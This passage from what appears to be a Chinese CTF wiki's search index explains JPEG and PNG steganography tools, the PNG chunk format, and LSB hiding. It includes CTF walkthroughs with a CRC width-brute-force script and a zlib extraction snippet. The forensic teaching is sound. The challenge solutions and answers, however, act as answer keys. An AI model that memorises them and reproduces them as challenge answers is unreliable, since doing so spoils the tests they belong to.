\u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jphide\u5d4c\u5165\u7684\u3002 i \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528invisible secrets\u5d4c\u5165\u7684\u3002","title":"Stegdetect"},{"location":"misc/picture/jpg/#jphs","text":"JPEG \u56fe\u50cf\u7684\u4fe1\u606f\u9690\u85cf\u8f6f\u4ef6 JPHS\uff0c\u5b83\u662f\u7531 Allan Latham \u5f00\u53d1\u8bbe\u8ba1\u5b9e\u73b0\u5728 Windows \u548c Linux \u7cfb\u7edf\u5e73\u53f0\u9488\u5bf9\u6709\u635f\u538b\u7f29 JPEG \u6587\u4ef6\u8fdb\u884c\u4fe1\u606f\u52a0\u5bc6\u9690\u85cf\u548c\u63a2\u6d4b\u63d0\u53d6\u7684\u5de5\u5177\u3002\u8f6f\u4ef6\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e24\u4e2a\u7a0b\u5e8f JPHIDE\u548c JPSEEK\u3002JPHIDE \u7a0b\u5e8f\u4e3b\u8981\u662f\u5b9e\u73b0\u5c06\u4fe1\u606f\u6587\u4ef6\u52a0\u5bc6\u9690\u85cf\u5230 JPEG \u56fe\u50cf\u529f\u80fd\uff0c\u800c JPSEEK \u7a0b\u5e8f\u4e3b\u8981\u5b9e\u73b0\u4ece\u7528 JPHIDE \u7a0b\u5e8f\u52a0\u5bc6\u9690\u85cf\u5f97\u5230\u7684 JPEG \u56fe\u50cf\u63a2\u6d4b\u63d0\u53d6\u4fe1\u606f\u6587\u4ef6\uff0cWindows \u7248\u672c\u7684 JPHS \u91cc\u7684 JPHSWIN \u7a0b\u5e8f\u5177\u6709\u56fe\u5f62\u5316\u64cd\u4f5c\u754c\u9762\u4e14\u5177\u5907 JPHIDE \u548c JPSEEK \u7684\u529f\u80fd\u3002","title":"JPHS"},{"location":"misc/picture/jpg/#silenteye","text":"SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.","title":"SilentEye"},{"location":"misc/picture/png/","text":"\u6587\u4ef6\u683c\u5f0f \u00b6 \u5bf9\u4e8e\u4e00\u4e2a PNG \u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff0c\u5269\u4f59\u7684\u90e8\u5206\u7531 3 \u4e2a\u4ee5\u4e0a\u7684 PNG \u7684\u6570\u636e\u5757\uff08Chunk\uff09\u6309\u7167\u7279\u5b9a\u7684\u987a\u5e8f\u7ec4\u6210\u3002 \u6587\u4ef6\u5934 89 50 4E 47 0D 0A 1A 0A + \u6570\u636e\u5757 + \u6570\u636e\u5757 + \u6570\u636e\u5757\u2026\u2026 \u6570\u636e\u5757CHUNk \u00b6 PNG \u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5757\uff0c\u4e00\u79cd\u662f\u79f0\u4e3a\u5173\u952e\u6570\u636e\u5757\uff08critical chunk\uff09\uff0c\u8fd9\u662f\u6807\u51c6\u7684\u6570\u636e\u5757\uff0c\u53e6\u4e00\u79cd\u53eb\u505a\u8f85\u52a9\u6570\u636e\u5757\uff08ancillary chunks\uff09\uff0c\u8fd9\u662f\u53ef\u9009\u7684\u6570\u636e\u5757\u3002\u5173\u952e\u6570\u636e\u5757\u5b9a\u4e49\u4e86 4 \u4e2a\u6807\u51c6\u6570\u636e\u5757\uff0c\u6bcf\u4e2a PNG \u6587\u4ef6\u90fd\u5fc5\u987b\u5305\u542b\u5b83\u4eec\uff0cPNG \u8bfb\u5199\u8f6f\u4ef6\u4e5f\u90fd\u5fc5\u987b\u8981\u652f\u6301\u8fd9\u4e9b\u6570\u636e\u5757\u3002 \u6570\u636e\u5757\u7b26\u53f7 \u6570\u636e\u5757\u540d\u79f0 \u591a\u6570\u636e\u5757 \u53ef\u9009\u5426 \u4f4d\u7f6e\u9650\u5236 IHDR \u6587\u4ef6\u5934\u6570\u636e\u5757 \u5426 \u5426 \u7b2c\u4e00\u5757 cHRM \u57fa\u8272\u548c\u767d\u8272\u70b9\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d gAMA \u56fe\u50cf\u03b3\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d sBIT \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d PLTE \u8c03\u8272\u677f\u6570\u636e\u5757 \u5426 \u662f \u5728IDAT\u4e4b\u524d bKGD \u80cc\u666f\u989c\u8272\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d hIST \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d tRNS \u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d oFFs (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u5426 \u662f \u5728IDAT\u4e4b\u524d pHYs \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 \u5426 \u662f \u5728IDAT\u4e4b\u524d sCAL (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u5426 \u662f \u5728IDAT\u4e4b\u524d IDAT \u56fe\u50cf\u6570\u636e\u5757 \u662f \u5426 \u4e0e\u5176\u4ed6IDAT\u8fde\u7eed tIME \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 \u5426 \u662f \u65e0\u9650\u5236 tEXt \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 \u662f \u662f \u65e0\u9650\u5236 zTXt \u538b\u7f29\u6587\u672c\u6570\u636e\u5757 \u662f \u662f \u65e0\u9650\u5236 fRAc (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFg (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFt (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFx (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 IEND \u56fe\u50cf\u7ed3\u675f\u6570\u636e \u5426 \u5426 \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757 \u5bf9\u4e8e\u6bcf\u4e2a\u6570\u636e\u5757\u90fd\u6709\u7740\u7edf\u4e00\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bcf\u4e2a\u6570\u636e\u5757\u7531 4 \u4e2a\u90e8\u5206\u7ec4\u6210 \u540d\u79f0 \u5b57\u8282\u6570 \u8bf4\u660e Length\uff08\u957f\u5ea6\uff09 4\u5b57\u8282 \u6307\u5b9a\u6570\u636e\u5757\u4e2d\u6570\u636e\u57df\u7684\u957f\u5ea6\uff0c\u5176\u957f\u5ea6\u4e0d\u8d85\u8fc7\uff08231\uff0d1\uff09\u5b57\u8282 Chunk Type Code\uff08\u6570\u636e\u5757\u7c7b\u578b\u7801\uff09 4\u5b57\u8282 \u6570\u636e\u5757\u7c7b\u578b\u7801\u7531 ASCII \u5b57\u6bcd\uff08A - Z \u548c a - z\uff09\u7ec4\u6210 Chunk Data\uff08\u6570\u636e\u5757\u6570\u636e\uff09 \u53ef\u53d8\u957f\u5ea6 \u5b58\u50a8\u6309\u7167 Chunk Type Code \u6307\u5b9a\u7684\u6570\u636e CRC\uff08\u5faa\u73af\u5197\u4f59\u68c0\u6d4b\uff09 4\u5b57\u8282 \u5b58\u50a8\u7528\u6765\u68c0\u6d4b\u662f\u5426\u6709\u9519\u8bef\u7684\u5faa\u73af\u5197\u4f59\u7801 CRC\uff08Cyclic Redundancy Check\uff09\u57df\u4e2d\u7684\u503c\u662f\u5bf9 Chunk Type Code \u57df\u548c Chunk Data \u57df\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\u5f97\u5230\u7684\u3002 IHDR \u00b6 \u6587\u4ef6\u5934\u6570\u636e\u5757 IHDR\uff08Header Chunk\uff09\uff1a\u5b83\u5305\u542b\u6709 PNG \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u7531 13 \u5b57\u8282\u7ec4\u6210\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728 PNG \u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2a PNG \u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757 \u5176\u4e2d\u6211\u4eec\u5173\u6ce8\u7684\u662f\u524d8\u5b57\u8282\u7684\u5185\u5bb9 \u57df\u7684\u540d\u79f0 \u5b57\u8282\u6570 \u8bf4\u660e Width 4 bytes \u56fe\u50cf\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d Height 4 bytes \u56fe\u50cf\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d \u6211\u4eec\u7ecf\u5e38\u4f1a\u53bb\u66f4\u6539\u4e00\u5f20\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u4f7f\u5f97\u4e00\u5f20\u56fe\u7247\u663e\u793a\u4e0d\u5b8c\u6574\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u4fe1\u606f\u7684\u76ee\u7684\u3002 \u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5728 Kali \u4e2d\u662f\u6253\u4e0d\u5f00\u8fd9\u5f20\u56fe\u7247\u7684\uff0c\u63d0\u793a IHDR CRC error \uff0c\u800c Windows 10 \u81ea\u5e26\u7684\u56fe\u7247\u67e5\u770b\u5668\u80fd\u591f\u6253\u5f00\uff0c\u5c31\u63d0\u9192\u4e86\u6211\u4eec IHDR \u5757\u88ab\u4eba\u4e3a\u7684\u7be1\u6539\u8fc7\u4e86\uff0c\u4ece\u800c\u5c1d\u8bd5\u4fee\u6539\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u53d1\u73b0\u9690\u85cf\u7684\u5b57\u7b26\u4e32\u3002 \u4f8b\u9898 \u00b6 WDCTF-finals-2017 \u00b6 \u89c2\u5bdf\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0,\u6587\u4ef6\u5934\u53ca\u5bbd\u5ea6\u5f02\u5e38 00000000 80 59 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.YNG........IHDR| 00000010 00 00 00 00 00 00 02 f8 08 06 00 00 00 93 2f 8a |............../.| 00000020 6b 00 00 00 04 67 41 4d 41 00 00 9c 40 20 0d e4 |k....gAMA...@ ..| 00000030 cb 00 00 00 20 63 48 52 4d 00 00 87 0f 00 00 8c |.... cHRM.......| 00000040 0f 00 00 fd 52 00 00 81 40 00 00 7d 79 00 00 e9 |....R...@..}y...| ... \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6587\u4ef6\u5bbd\u5ea6\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\uff0c\u9700\u8981\u6839\u636e IHDR \u5757\u7684 CRC \u503c\u7206\u7834\u5f97\u5230\u5bbd\u5ea6,\u5426\u5219\u56fe\u7247\u663e\u793a\u9519\u8bef\u4e0d\u80fd\u5f97\u5230 flag\u3002 import os import binascii import struct misc = open ( \"misc4.png\" , \"rb\" ) . read () for i in range ( 1024 ): data = misc [ 12 : 16 ] + struct . pack ( '>i' , i ) + misc [ 20 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0x932f8a6b : print i \u5f97\u5230\u5bbd\u5ea6\u503c\u4e3a 709 \u540e\uff0c\u6062\u590d\u56fe\u7247\u5f97\u5230 flag\u3002 PLTE \u00b6 \u8c03\u8272\u677f\u6570\u636e\u5757 PLTE\uff08palette chunk\uff09\uff1a\u5b83\u5305\u542b\u6709\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\uff08indexed-color image\uff09\u76f8\u5173\u7684\u5f69\u8272\u53d8\u6362\u6570\u636e\uff0c\u5b83\u4ec5\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\u6709\u5173\uff0c\u800c\u4e14\u8981\u653e\u5728\u56fe\u50cf\u6570\u636e\u5757\uff08image data chunk\uff09\u4e4b\u524d\u3002\u771f\u5f69\u8272\u7684 PNG \u6570\u636e\u6d41\u4e5f\u53ef\u4ee5\u6709\u8c03\u8272\u677f\u6570\u636e\u5757\uff0c\u76ee\u7684\u662f\u4fbf\u4e8e\u975e\u771f\u5f69\u8272\u663e\u793a\u7a0b\u5e8f\u7528\u5b83\u6765\u91cf\u5316\u56fe\u50cf\u6570\u636e\uff0c\u4ece\u800c\u663e\u793a\u8be5\u56fe\u50cf\u3002 IDAT \u00b6 \u56fe\u50cf\u6570\u636e\u5757 IDAT\uff08image data chunk\uff09\uff1a\u5b83\u5b58\u50a8\u5b9e\u9645\u7684\u6570\u636e\uff0c\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757\u3002 \u50a8\u5b58\u56fe\u50cf\u50cf\u6570\u6570\u636e \u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757 \u91c7\u7528 LZ77 \u7b97\u6cd5\u7684\u6d3e\u751f\u7b97\u6cd5\u8fdb\u884c\u538b\u7f29 \u53ef\u4ee5\u7528 zlib \u89e3\u538b\u7f29 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cIDAT \u5757\u53ea\u6709\u5f53\u4e0a\u4e00\u4e2a\u5757\u5145\u6ee1\u65f6\uff0c\u624d\u4f1a\u7ee7\u7eed\u4e00\u4e2a\u65b0\u7684\u5757\u3002 \u7528 pngcheck \u53bb\u67e5\u770b\u6b64 PNG \u6587\u4ef6 \u03bb . \\p ngcheck.exe -v sctf.png File: sctf.png ( 1421461 bytes ) chunk IHDR at offset 0x0000c, length 13 1000 x 562 image, 32 -bit RGB+alpha, non-interlaced chunk sRGB at offset 0x00025, length 1 rendering intent = perceptual chunk gAMA at offset 0x00032, length 4 : 0 .45455 chunk pHYs at offset 0x00042, length 9 : 3780x3780 pixels/meter ( 96 dpi ) chunk IDAT at offset 0x00057, length 65445 zlib: deflated, 32K window, fast compression chunk IDAT at offset 0x10008, length 65524 ... chunk IDAT at offset 0x150008, length 45027 chunk IDAT at offset 0x15aff7, length 138 chunk IEND at offset 0x15b08d, length 0 No errors detected in sctf.png ( 28 chunks, 36 .8% compression ) . \u53ef\u4ee5\u770b\u5230\uff0c\u6b63\u5e38\u7684\u5757\u7684 length \u662f\u5728 65524 \u7684\u65f6\u5019\u5c31\u6ee1\u4e86\uff0c\u800c\u5012\u6570\u7b2c\u4e8c\u4e2a IDAT \u5757\u957f\u5ea6\u662f 45027\uff0c\u6700\u540e\u4e00\u4e2a\u957f\u5ea6\u662f 138\uff0c\u5f88\u660e\u663e\u6700\u540e\u4e00\u4e2a IDAT \u5757\u662f\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a\u4ed6\u672c\u6765\u5e94\u8be5\u5e76\u5165\u5230\u5012\u6570\u7b2c\u4e8c\u4e2a\u672a\u6ee1\u7684\u5757\u91cc. \u5229\u7528 python zlib \u89e3\u538b\u591a\u4f59 IDAT \u5757\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u6ce8\u610f\u5254\u9664 \u957f\u5ea6\u3001\u6570\u636e\u5757\u7c7b\u578b\u53ca\u672b\u5c3e\u7684CRC\u6821\u9a8c\u503c \u3002 import zlib import binascii IDAT = \"789...667\" . decode ( 'hex' ) result = binascii . hexlify ( zlib . decompress ( IDAT )) print result IEND \u00b6 \u56fe\u50cf\u7ed3\u675f\u6570\u636e IEND\uff08image trailer chunk\uff09\uff1a\u5b83\u7528\u6765\u6807\u8bb0 PNG \u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002 00 00 00 00 49 45 4E 44 AE 42 60 82 IEND \u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f 00 00 00 00 \uff0c\u6570\u636e\u6807\u8bc6\u603b\u662f IEND 49 45 4E 44 \uff0c\u56e0\u6b64\uff0cCRC \u7801\u4e5f\u603b\u662f AE 42 60 82 \u3002 \u5176\u4f59\u8f85\u52a9\u6570\u636e\u5757 \u00b6 \u80cc\u666f\u989c\u8272\u6570\u636e\u5757 bKGD\uff08background color\uff09 \u57fa\u8272\u548c\u767d\u8272\u5ea6\u6570\u636e\u5757 cHRM\uff08primary chromaticities and white point\uff09\uff0c\u6240\u8c13\u767d\u8272\u5ea6\u662f\u6307\u5f53 R\uff1dG\uff1dB\uff1d\u6700\u5927\u503c \u65f6\u5728\u663e\u793a\u5668\u4e0a\u4ea7\u751f\u7684\u767d\u8272\u5ea6 \u56fe\u50cf \u03b3 \u6570\u636e\u5757 gAMA\uff08image gamma\uff09 \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 hIST\uff08image histogram\uff09 \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 pHYs\uff08physical pixel dimensions\uff09 \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 sBIT\uff08significant bits\uff09 \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 tEXt\uff08textual data\uff09 \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 tIME \uff08image last-modification time\uff09 \u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 tRNS \uff08transparency\uff09 \u538b\u7f29\u6587\u672c\u6570\u636e\u5757 zTXt \uff08compressed textual data\uff09 LSB \u00b6 LSB \u5168\u79f0 Least Significant Bit\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\u3002PNG \u6587\u4ef6\u4e2d\u7684\u56fe\u50cf\u50cf\u6570\u4e00\u822c\u662f\u7531 RGB \u4e09\u539f\u8272\uff08\u7ea2\u7eff\u84dd\uff09\u7ec4\u6210\uff0c\u6bcf\u4e00\u79cd\u989c\u8272\u5360\u7528 8 \u4f4d\uff0c\u53d6\u503c\u8303\u56f4\u4e3a 0x00 \u81f3 0xFF \uff0c\u5373\u6709 256 \u79cd\u989c\u8272\uff0c\u4e00\u5171\u5305\u542b\u4e86 256 \u7684 3 \u6b21\u65b9\u7684\u989c\u8272\uff0c\u5373 16777216 \u79cd\u989c\u8272\u3002 \u800c\u4eba\u7c7b\u7684\u773c\u775b\u53ef\u4ee5\u533a\u5206\u7ea61000\u4e07\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u610f\u5473\u7740\u4eba\u7c7b\u7684\u773c\u775b\u65e0\u6cd5\u533a\u5206\u4f59\u4e0b\u7684\u989c\u8272\u5927\u7ea6\u67096777216\u79cd\u3002 LSB \u9690\u5199\u5c31\u662f\u4fee\u6539 RGB \u989c\u8272\u5206\u91cf\u7684\u6700\u4f4e\u4e8c\u8fdb\u5236\u4f4d\uff08LSB\uff09\uff0c\u6bcf\u4e2a\u989c\u8272\u4f1a\u6709 8 bit\uff0cLSB \u9690\u5199\u5c31\u662f\u4fee\u6539\u4e86\u50cf\u6570\u4e2d\u7684\u6700\u4f4e\u7684 1 bit\uff0c\u800c\u4eba\u7c7b\u7684\u773c\u775b\u4e0d\u4f1a\u6ce8\u610f\u5230\u8fd9\u524d\u540e\u7684\u53d8\u5316\uff0c\u6bcf\u4e2a\u50cf\u7d20\u53ef\u4ee5\u643a\u5e26 3 \u6bd4\u7279\u7684\u4fe1\u606f\u3002 \u5982\u679c\u662f\u8981\u5bfb\u627e\u8fd9\u79cd LSB \u9690\u85cf\u75d5\u8ff9\u7684\u8bdd\uff0c\u6709\u4e00\u4e2a\u5de5\u5177 Stegsolve \u662f\u4e2a\u795e\u5668\uff0c\u53ef\u4ee5\u6765\u8f85\u52a9\u6211\u4eec\u8fdb\u884c\u5206\u6790\u3002 \u901a\u8fc7\u4e0b\u65b9\u7684\u6309\u94ae\u53ef\u4ee5\u89c2\u5bdf\u6bcf\u4e2a\u901a\u9053\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u67e5\u770b R \u901a\u9053\u7684\u6700\u4f4e\u4f4d\u7b2c 8 \u4f4d\u5e73\u9762\u7684\u4fe1\u606f\u3002 LSB \u7684\u4fe1\u606f\u501f\u52a9\u4e8e Stegsolve \u67e5\u770b\u5404\u4e2a\u901a\u9053\u65f6\u4e00\u5b9a\u8981\u7ec6\u5fc3\u6355\u6349\u5f02\u5e38\u70b9\uff0c\u6293\u4f4f LSB \u9690\u5199\u7684\u86db\u4e1d\u9a6c\u8ff9\u3002 \u4f8b\u9898 \u00b6 HCTF - 2016 - Misc \u8fd9\u9898\u7684\u4fe1\u606f\u9690\u85cf\u5728 RGB \u4e09\u4e2a\u901a\u9053\u7684\u6700\u4f4e\u4f4d\u4e2d\uff0c\u501f\u52a9 Stegsolve-->Analyse-->Data Extract \u53ef\u4ee5\u6307\u5b9a\u901a\u9053\u8fdb\u884c\u63d0\u53d6\u3002 \u53ef\u4ee5\u53d1\u73b0 zip \u5934\uff0c\u7528 save bin \u4fdd\u5b58\u4e3a\u538b\u7f29\u5305\u540e\uff0c\u6253\u5f00\u8fd0\u884c\u5176\u4e2d\u7684 ELF \u6587\u4ef6\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684 flag\u3002 \u66f4\u591a\u5173\u4e8e LSB \u7684\u7814\u7a76\u53ef\u4ee5\u770b \u8fd9\u91cc \u3002 \u9690\u5199\u8f6f\u4ef6 \u00b6 Stepic","title":"PNG"},{"location":"misc/picture/png/#_1","text":"\u5bf9\u4e8e\u4e00\u4e2a PNG \u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff0c\u5269\u4f59\u7684\u90e8\u5206\u7531 3 \u4e2a\u4ee5\u4e0a\u7684 PNG \u7684\u6570\u636e\u5757\uff08Chunk\uff09\u6309\u7167\u7279\u5b9a\u7684\u987a\u5e8f\u7ec4\u6210\u3002 \u6587\u4ef6\u5934 89 50 4E 47 0D 0A 1A 0A + \u6570\u636e\u5757 + \u6570\u636e\u5757 + \u6570\u636e\u5757\u2026\u2026","title":"\u6587\u4ef6\u683c\u5f0f"},{"location":"misc/picture/png/#chunk","text":"PNG \u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5757\uff0c\u4e00\u79cd\u662f\u79f0\u4e3a\u5173\u952e\u6570\u636e\u5757\uff08critical chunk\uff09\uff0c\u8fd9\u662f\u6807\u51c6\u7684\u6570\u636e\u5757\uff0c\u53e6\u4e00\u79cd\u53eb\u505a\u8f85\u52a9\u6570\u636e\u5757\uff08ancillary chunks\uff09\uff0c\u8fd9\u662f\u53ef\u9009\u7684\u6570\u636e\u5757\u3002\u5173\u952e\u6570\u636e\u5757\u5b9a\u4e49\u4e86 4 \u4e2a\u6807\u51c6\u6570\u636e\u5757\uff0c\u6bcf\u4e2a PNG \u6587\u4ef6\u90fd\u5fc5\u987b\u5305\u542b\u5b83\u4eec\uff0cPNG \u8bfb\u5199\u8f6f\u4ef6\u4e5f\u90fd\u5fc5\u987b\u8981\u652f\u6301\u8fd9\u4e9b\u6570\u636e\u5757\u3002 \u6570\u636e\u5757\u7b26\u53f7 \u6570\u636e\u5757\u540d\u79f0 \u591a\u6570\u636e\u5757 \u53ef\u9009\u5426 \u4f4d\u7f6e\u9650\u5236 IHDR \u6587\u4ef6\u5934\u6570\u636e\u5757 \u5426 \u5426 \u7b2c\u4e00\u5757 cHRM \u57fa\u8272\u548c\u767d\u8272\u70b9\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d gAMA \u56fe\u50cf\u03b3\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d sBIT \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d PLTE \u8c03\u8272\u677f\u6570\u636e\u5757 \u5426 \u662f \u5728IDAT\u4e4b\u524d bKGD \u80cc\u666f\u989c\u8272\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d hIST \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d tRNS \u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d oFFs (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u5426 \u662f \u5728IDAT\u4e4b\u524d pHYs \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 \u5426 \u662f \u5728IDAT\u4e4b\u524d sCAL (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u5426 \u662f \u5728IDAT\u4e4b\u524d IDAT \u56fe\u50cf\u6570\u636e\u5757 \u662f \u5426 \u4e0e\u5176\u4ed6IDAT\u8fde\u7eed tIME \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 \u5426 \u662f \u65e0\u9650\u5236 tEXt \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 \u662f \u662f \u65e0\u9650\u5236 zTXt \u538b\u7f29\u6587\u672c\u6570\u636e\u5757 \u662f \u662f \u65e0\u9650\u5236 fRAc (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFg (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFt (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 gIFx (\u4e13\u7528\u516c\u5171\u6570\u636e\u5757\uff09 \u662f \u662f \u65e0\u9650\u5236 IEND \u56fe\u50cf\u7ed3\u675f\u6570\u636e \u5426 \u5426 \u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757 \u5bf9\u4e8e\u6bcf\u4e2a\u6570\u636e\u5757\u90fd\u6709\u7740\u7edf\u4e00\u7684\u6570\u636e\u7ed3\u6784\uff0c\u6bcf\u4e2a\u6570\u636e\u5757\u7531 4 \u4e2a\u90e8\u5206\u7ec4\u6210 \u540d\u79f0 \u5b57\u8282\u6570 \u8bf4\u660e Length\uff08\u957f\u5ea6\uff09 4\u5b57\u8282 \u6307\u5b9a\u6570\u636e\u5757\u4e2d\u6570\u636e\u57df\u7684\u957f\u5ea6\uff0c\u5176\u957f\u5ea6\u4e0d\u8d85\u8fc7\uff08231\uff0d1\uff09\u5b57\u8282 Chunk Type Code\uff08\u6570\u636e\u5757\u7c7b\u578b\u7801\uff09 4\u5b57\u8282 \u6570\u636e\u5757\u7c7b\u578b\u7801\u7531 ASCII \u5b57\u6bcd\uff08A - Z \u548c a - z\uff09\u7ec4\u6210 Chunk Data\uff08\u6570\u636e\u5757\u6570\u636e\uff09 \u53ef\u53d8\u957f\u5ea6 \u5b58\u50a8\u6309\u7167 Chunk Type Code \u6307\u5b9a\u7684\u6570\u636e CRC\uff08\u5faa\u73af\u5197\u4f59\u68c0\u6d4b\uff09 4\u5b57\u8282 \u5b58\u50a8\u7528\u6765\u68c0\u6d4b\u662f\u5426\u6709\u9519\u8bef\u7684\u5faa\u73af\u5197\u4f59\u7801 CRC\uff08Cyclic Redundancy Check\uff09\u57df\u4e2d\u7684\u503c\u662f\u5bf9 Chunk Type Code \u57df\u548c Chunk Data \u57df\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\u5f97\u5230\u7684\u3002","title":"\u6570\u636e\u5757CHUNk"},{"location":"misc/picture/png/#ihdr","text":"\u6587\u4ef6\u5934\u6570\u636e\u5757 IHDR\uff08Header Chunk\uff09\uff1a\u5b83\u5305\u542b\u6709 PNG \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u56fe\u50cf\u6570\u636e\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u7531 13 \u5b57\u8282\u7ec4\u6210\uff0c\u5e76\u8981\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u6570\u636e\u5757\u51fa\u73b0\u5728 PNG \u6570\u636e\u6d41\u4e2d\uff0c\u800c\u4e14\u4e00\u4e2a PNG 